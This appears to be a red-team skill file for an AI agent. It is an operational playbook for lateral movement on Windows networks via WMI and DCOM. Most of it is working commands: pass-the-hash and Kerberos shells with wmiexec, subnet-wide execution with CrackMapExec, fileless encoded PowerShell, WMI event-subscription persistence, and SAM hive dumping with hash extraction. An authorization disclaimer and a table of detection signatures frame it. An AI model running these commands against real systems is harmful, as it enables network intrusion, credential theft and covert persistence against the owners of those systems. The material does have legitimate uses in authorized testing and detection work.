---
name: performing-lateral-movement-with-wmiexec
description: Perform lateral movement across Windows networks using WMI-based remote execution techniques including Impacket wmiexec.py, CrackMapExec, and native WMI commands for stealthy post-exploitation during red team engagements.
subdomain: red-teaming
facing: config
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1021
nist_csf:
- ID.RA-01
- GV.OV-02
- DE.AE-07
upstream: performing-lateral-movement-with-wmiexec@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Prerequisites

- Familiarity with red teaming concepts and tools
- Access to test or lab environment for safe execution
- Python 3.8+ with required dependencies installed
- Appropriate authorization for any testing activities

## MITRE ATT&CK Mapping

- **T1047** - Windows Management Instrumentation
- **T1021.003** - Remote Services: Distributed Component Object Model (DCOM)
- **T1550.002** - Use Alternate Authentication Material: Pass Hash
- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1570** - Lateral Tool Transfer

## Workflow

### Phase 1: WMIExec with Impacket

1. Execute semi-interactive shell with credentials:
   ```bash
   # With cleartext password
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50

   # With NT hash (Pass-the-Hash)
   wmiexec.py -hashes :a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 domain.local/admin@10.10.10.50

   # With Kerberos ticket
   export KRB5CCNAME=admin.ccache
   wmiexec.py -k -no-pass domain.local/admin@TARGET01.domain.local

   # Execute specific command (non-interactive)
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "ipconfig /all"
   ```
2. Execute commands without output file (stealthier using DCOM):
   ```bash
   # Using dcomexec.py as alternative (MMC20.Application DCOM object)
   dcomexec.py -object MMC20 domain.local/admin:'Password123'@10.10.10.50

   # Using ShellWindows DCOM object
   dcomexec.py -object ShellWindows domain.local/admin:'Password123'@10.10.10.50
   ```

### Phase 2: CrackMapExec Multi-Target Execution

1. Execute commands across multiple targets:
   ```bash
   # Execute single command on subnet
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -x "whoami"

   # Execute with hash
   crackmapexec wmi 10.10.10.0/24 -u admin -H a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4 -x "ipconfig"

   # Execute PowerShell command
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123' -X "Get-Process"

   # Check local admin access via WMI
   crackmapexec wmi 10.10.10.0/24 -u admin -p 'Password123'
   ```

### Phase 3: Native WMI Commands (Windows)

1. Execute remote commands using built-in Windows WMI tools:
   ```powershell
   # Using wmic.exe (deprecated but still available)
   wmic /node:10.10.10.50 /user:domain\admin /password:Password123 process call create "cmd.exe /c whoami > C:\temp\out.txt"

   # Using PowerShell Invoke-WmiMethod
   $cred = Get-Credential
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "cmd.exe /c ipconfig > C:\temp\output.txt"

   # Using CIM sessions (modern replacement for WMI)
   $session = New-CimSession -ComputerName 10.10.10.50 -Credential $cred
   Invoke-CimMethod -CimSession $session -ClassName Win32_Process `
     -MethodName Create -Arguments @{CommandLine="cmd.exe /c whoami"}
   ```
2. Fileless PowerShell execution via WMI:
   ```powershell
   # Execute encoded PowerShell command remotely
   $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('Get-Process | Out-File C:\temp\procs.txt'))
   Invoke-WmiMethod -Class Win32_Process -Name Create -ComputerName 10.10.10.50 `
     -Credential $cred -ArgumentList "powershell.exe -enc $cmd"
   ```

### Phase 4: WMI-Based Persistence

1. Create WMI event subscriptions for persistence:
   ```powershell
   # Create WMI event subscription (command runs on every logon)
   $filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter `
     -Arguments @{Name="PersistFilter"; EventNamespace="root\cimv2";
                  QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

   $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer `
     -Arguments @{Name="PersistConsumer"; CommandLineTemplate="cmd.exe /c <payload>"}

   Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding `
     -Arguments @{Filter=$filter; Consumer=$consumer}
   ```

### Phase 5: Chaining with Credential Harvesting

1. Use WMI for remote credential extraction:
   ```bash
   # Dump SAM hashes via WMI + reg save
   wmiexec.py domain.local/admin:'Password123'@10.10.10.50 "reg save HKLM\SAM C:\temp\sam && reg save HKLM\SYSTEM C:\temp\system"

   # Download saved hives
   smbclient.py domain.local/admin:'Password123'@10.10.10.50
   > get C:\temp\sam
   > get C:\temp\system

   # Extract hashes from saved hives
   secretsdump.py -sam sam -system system LOCAL
   ```

## Tools and Resources

| Tool | Purpose | Platform |
|------|---------|----------|
| wmiexec.py | Semi-interactive WMI shell (Impacket) | Linux (Python) |
| dcomexec.py | DCOM-based remote execution (Impacket) | Linux (Python) |
| CrackMapExec | Multi-target WMI execution | Linux (Python) |
| wmic.exe | Native Windows WMI command-line tool | Windows |
| PowerShell CIM | Modern WMI cmdlets | Windows |
| SharpWMI | .NET WMI execution tool | Windows (.NET) |

## WMI Execution Methods Comparison

| Method | Service Created | Output Method | Stealth Level |
|--------|----------------|---------------|---------------|
| wmiexec.py | No | Temp file on ADMIN$ | Medium |
| dcomexec.py | No | Temp file on ADMIN$ | Medium-High |
| wmic.exe | No | None (blind) or redirect | Medium |
| PowerShell WMI | No | None (blind) or redirect | High |
| PsExec (comparison) | Yes | Service output pipe | Low |

## Detection Signatures

| Indicator | Detection Method |
|-----------|-----------------|
| Win32_Process.Create WMI calls | Event 4688 (process creation) with WMI parent process |
| WMI temporary output files on ADMIN$ | File monitoring on ADMIN$ share for temp files |
| Remote WMI connections (DCOM/135) | Network monitoring for DCOM traffic to workstations |
| WmiPrvSE.exe spawning cmd.exe/powershell.exe | EDR process tree analysis |
| Event 5857/5860/5861 | WMI Activity logs in Microsoft-Windows-WMI-Activity |

## Validation Criteria

- [ ] WMIExec shell established on remote target
- [ ] Pass-the-Hash execution validated via WMI
- [ ] Multi-target command execution via CrackMapExec WMI
- [ ] Native PowerShell WMI commands executed remotely
- [ ] Credential harvesting performed via WMI execution chain
- [ ] No service creation artifacts on target systems
- [ ] Evidence documented with command outputs and screenshots

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-lateral-movement-with-wmiexec
